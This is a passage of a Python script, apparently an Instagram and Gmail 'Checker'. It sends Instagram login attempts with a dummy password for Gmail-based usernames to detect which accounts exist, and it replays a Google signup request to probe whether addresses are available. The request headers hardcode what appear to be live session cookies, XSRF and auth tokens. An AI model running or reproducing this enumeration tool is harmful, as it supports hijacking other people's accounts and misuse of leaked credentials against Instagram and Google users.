__Host-GAPS=1:8pTs3fQUZi0PSARTUgKu0XQD7uTV2V70VDF8CCsojS0dlIRhSoNmFfZQNTyUyS4dLDyN6ooBCMpAbKh3LY3_MCD7VaxOjw:8YgpjTOK8955x5s0; SIDCC=APoG2W-kcNEPTAYb39TL2fO8qnBvjAXylVVDzCnQZWO5CyeGbPeHT_s59jfWE1WR-lOae4sBYqI; __Secure-1PSIDCC=APoG2W8N4c7gP3G-DWVqhS2gfO_IbSUR5YZeCPzxnYL4bGlX6HWq4YgQuAeUQaJ29-ausVXYQg; __Secure-3PSIDCC=APoG2W-1HlpLmTDjKURgPV16ED3Ryb4kQbTo-MSWiOf2Kewy1tmjtoTVtZjnKPr8RYT6ldCV2AU',
                                        'Google-Accounts-Xsrf': '1',
                                        'Origin': 'https://accounts.google.com',
                                        'Referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fe-11-8976fbef68f7663ea60e661c4f9b5-1475984d740df90158840a19af1784235fe51b7e&flowName=GlifWebSignIn&flowEntry=SignUp',
                                        'Sec-Ch-Ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
                                        'Sec-Ch-Ua-Arch': '"x86"',
                                        'Sec-Ch-Ua-Bitness': '"64"',
                                        'Sec-Ch-Ua-Full-Version': '"114.0.5735.199"',
                                        'Sec-Ch-Ua-Full-Version-List': '"Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.199", "Google Chrome";v="114.0.5735.199"',
                                        'Sec-Ch-Ua-Mobile': '?0',
                                        'Sec-Ch-Ua-Model': '""',
                                        'Sec-Ch-Ua-Platform': '"Windows"',
                                        'Sec-Ch-Ua-Platform-Version': '"15.0.0"',
                                        'Sec-Ch-Ua-Wow64': '?0',
                                        'Sec-Fetch-Dest': 'empty',
                                        'Sec-Fetch-Mode': 'cors',
                                        'Sec-Fetch-Site': 'same-origin',
                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
                                        'X-Chrome-Id-Consistency-Request': 'version=1,client_id=77185425430.apps.googleusercontent.com,device_id=fbc22924-4987-44e1-b323-7d3efd00dded,signin_mode=all_accounts,signout_mode=show_confirmation',
                                        'X-Client-Data': 'CIm2yQEIprbJAQipncoBCIXwygEIlKHLAQiFoM0BCJyrzQEI2rTNAQjcvc0BCLy+zQEI1L7NAQjgxM0BCO/EzQEIqMXNAQ==',
                                        
                                        'X-Same-Domain': '1'


                                        }
                                    data1 ={
                                        'continue': 'https://accounts.google.com/ManageAccount?nc=1',
                                        'f.req': '["AEThLlzCTLyoshyixCRoA6ccDmpMOZ-PomPBC9ByGLX3o8xDU8VIGoGBy9vj5D-3txgufFW3ZtNzDWAvNXmveIo95oRGruoTaALFrDIhPuzD6SscTf--ya7mjnd2vNDxwPxgQ8x0xH0lZbKjF_sEWyzM-yiKQQMUpjq4lV_UmC87yQkt9qmndf-Jw-HrXgdPSNZYSfnvTk-u",null,null,null,null,0,0,"zaid","zaid","web-glif-signup",0,null,10,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"fbc22924-4987-44e1-b323-7d3efd00dded",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,null,[]],null,null,null,null,null,null,[],null,null,null,null,[]],1]',
                                        'at': 'AFoagUUm6HX36QVWDo2X-TVlmW9vQ8p6Iw:1689946784467',
                                        'azt': 'AFoagUWbi-h35AWa309jmxoLN8DKwbn2KA:1689946784467',
                                        'cookiesDisabled': 'false',
                                        'deviceinfo':' [null,null,null,[],null,"IQ",null,null,null,"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"fbc22924-4987-44e1-b323-7d3efd00dded",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,null,[]],null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,null,1,null,0,1,"",null,null,2,1]',
                                        'gmscoreversion': 'undefined',
                                        'flowName': 'GlifWebSignIn',
                                        'checkConnection': 'youtube:584:0',
                                        'checkedDomains': 'youtube',
                                        'pstMsg': '1'

                                    }
                                    print("wait..")
                                    
                                        
                                    rt=requests.post(url1,headers=headers,data=data1).text
                                    print(rt)
                                    
                                
                                    tp = rt.split('"gf.ttu",null,"')[1].split('"]')[0]
                                    with open('token.txt','w') as f0:
                                        f0.write(f'{tp}\n')
                                #tl=random.choice(fi)
                                #tl=tl
                        
                        
                        
                            

                        else:
                            self.bloak+=1
                            os.system('cls'if os.name=='nt'else'clear')
                            print(f'{self.oky}: {self.ok} - {self.bada} : {self.bad} - {self.badgm} : {self.bloak}')
                            

                except requests.exceptions.ReadTimeout as error:
                    continue
                
            except requests.exceptions.ConnectionError as error:
                continue
    def ch1(self):
        self.url ='https://www.instagram.com/api/v1/web/accounts/login/ajax/'

        self.head1 = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9',
                'content-length': '291',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': 'ig_did=735BE103-DEB8-49AD-8E6E-09C8DDAB8696; ig_nrcb=1; mid=Y0rdDwALAAF9nAJ20ejltiX0xwPD; datr=mt5KY8cDTj42n9H2F-WvsM6M; fbm_124024574287414=base_domain=.instagram.com; csrftoken=iMd8tAhvwezltsWZAVi1adkaSyB7EUzO; ds_user_id=58173081681; shbid="12243\05458173081681\0541711782047:01f709696fd88f95ae617bb02b5b6d15a9e8996d88f9e2d3ee8855533aedb9f4987abd92"; shbts="1680246047\05458173081681\0541711782047:01f7d73e9f512a0f35a524df1d0f51b48fcb0023309d321cfb9c3f54c755152397f7da58"; fbsr_124024574287414=LLfGuxN7PwilAJQ2w2bGqQmOX6p3T2JreIplqK1mKOo.eyJ1c2VyX2lkIjoiMTAwMDY0NTIzMTU1MTczIiwiY29kZSI6IkFRRFRUem5mcW1BRUJDbGZHcjJSWWV5UERTd3RhSEJTM2lsTERTaUdXZF9fTHdCaFp2VV9ndVltWEJINE9DenUxamJCbWh3TWtSVmdUOXRyWDVWTHlpcGFFY01fMFlSb3pHOVRibWE0NkRMMm9GTE9FWmJhdzhSNF84c2hDZl9FZGtwb2V4MmtSYTIzNm8xa3A2LWFzZGNRVVk4eVFSU3NwQzlhaEI4NFBYWk1FMVA4aUt5aEIzWGlXOGxjaGJ0Y1R2WEdsUnRBNl91MnlCNExxN09PRjdXZG1DT2p6c2lBM3BsZEY4X2FjX181OGpTUDBTSC1DS0dQMHZYYldlaVBDSWs2ell4SGtkRmNTVkdIUE5sTDB3aUk4azBNcVdSbl9nbXk5RWptV282dmRBQlpVTTVabmJwYXFOT2dLem9ndzRDU2x4WUI3clQtUzdjaWJUbGNqWTlZIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUVsVmlXS2JhMkJlRTEwSlBoS01iNVVsdFlhYUlKY05zZVdZWkFodFpCWkNUcElmOTZrNk9nTE9mTnZ1RjdMcUs5WkMyUk1NUWxCQXJPNzVuWkE3U3JLcEtLR3JsRDFEMU5QOWZ5MkxNZkQzeHNINGpMeG9tQUtoRGRnUW1Ea2dzNk10TFNVSEVQbVJFWkFXZkJ5Y1pDbGZmTmp5eGR5U1Jtb3JyN1N2SXN4Y3g2OTdxSVZSSXNaRCIsImFsZ29yaXRobSI6IkhNQUMtU0hBMjU2IiwiaXNzdWVkX2F0IjoxNjgwNTQwMzI3fQ',
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua': '"Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'sec-fetch-user': '?1',
        
                'user-agent': '{}'.format(generate_user_agent()),
                'x-csrftoken': 'iMd8tAhvwezltsWZAVi1adkaSyB7EUzO',
                'x-ig-app-id': '936619743392459',
                'x-ig-www-claim': '0',
                'x-instagram-ajax': '1007230059',
                'x-requested-with': 'XMLHttpRequest'
        }
        self.tim = str(time.time()).split('.')[0]
        self.data = {
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{self.tim}:zaidgzikbbmzz',
            'username': f'{self.em}@gmail.com',
            'queryParams': '{}',
            'optIntoOneTap': 'false',
            'trustedDeviceRecords': '{}'
        }
        try:
            try:
                
                self.rf = requests.post(self.url,headers=self.head1,data=self.data).text
                print(self.rf)
                if ('"Sorry, your password was incorrect. Please double-check your password."') in self.rf:
                    self.bad+=1
                    os.system('cls'if os.name=='nt'else'clear')
                    print(f'{self.oky}: {self.ok} - {self.bada} : {self.bad} - {self.badgm} : {self.bloak}')
                elif ('"Sorry, there was a problem with your request.') in self.rf:
                    time.sleep(26)
            except requests.exceptions.ReadTimeout as error:
                pass
            
        except requests.exceptions.ConnectionError as error:
            pass
    

Checker()
